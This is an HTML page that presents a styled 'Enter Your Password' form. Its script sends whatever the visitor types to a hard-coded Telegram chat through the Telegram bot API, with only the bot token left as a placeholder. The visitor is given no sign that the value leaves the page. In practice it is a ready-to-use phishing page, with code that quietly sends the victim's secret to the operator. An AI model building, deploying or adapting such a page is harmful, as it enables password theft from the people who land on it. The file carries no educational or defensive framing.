<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Name Sender</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#f3f3f3;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:320px;
    background:white;
    padding:25px;
    border-radius:12px;
    box-shadow:0 5px 20px rgba(0,0,0,.15);
    text-align:center;
}

h2{
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
    margin-bottom:15px;
}

button{
    width:100%;
    padding:12px;
    background:#0088cc;
    color:white;
    border:none;
    border-radius:8px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0077b6;
}

#status{
    margin-top:15px;
    color:green;
}
</style>

</head>
<body>

<div class="container">
    <h2>Enter Your Password</h2>

    <form id="nameForm">
        <input
            type="text"
            id="name"
            placeholder="Enter your password"
            required
        >

        <button type="submit">ENTER</button>
    </form>

    <p id="status"></p>
</div>

<script>
const BOT_TOKEN = "YOUR_NEW_BOT_TOKEN";
const CHAT_ID = "6557159068";

document.getElementById("nameForm").addEventListener("submit", async function(e){

    e.preventDefault();

    const name = document.getElementById("name").value.trim();

    if(name === ""){
        return;
    }

    document.getElementById("status").innerHTML = "Sending...";

    const message = `📩 New Name\n\n👤 ${name}`;

    try{

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                chat_id:CHAT_ID,
                text:message
            })
        });

        const data = await response.json();

        if(data.ok){
            document.getElementById("status").innerHTML = "✅ Sent Successfully";
            document.getElementById("name").value = "";
        }else{
            document.getElementById("status").innerHTML = "❌ Failed";
            console.log(data);
        }

    }catch(error){
        document.getElementById("status").innerHTML = "❌ Network Error";
        console.log(error);
    }

});
</script>

</body>
</html>
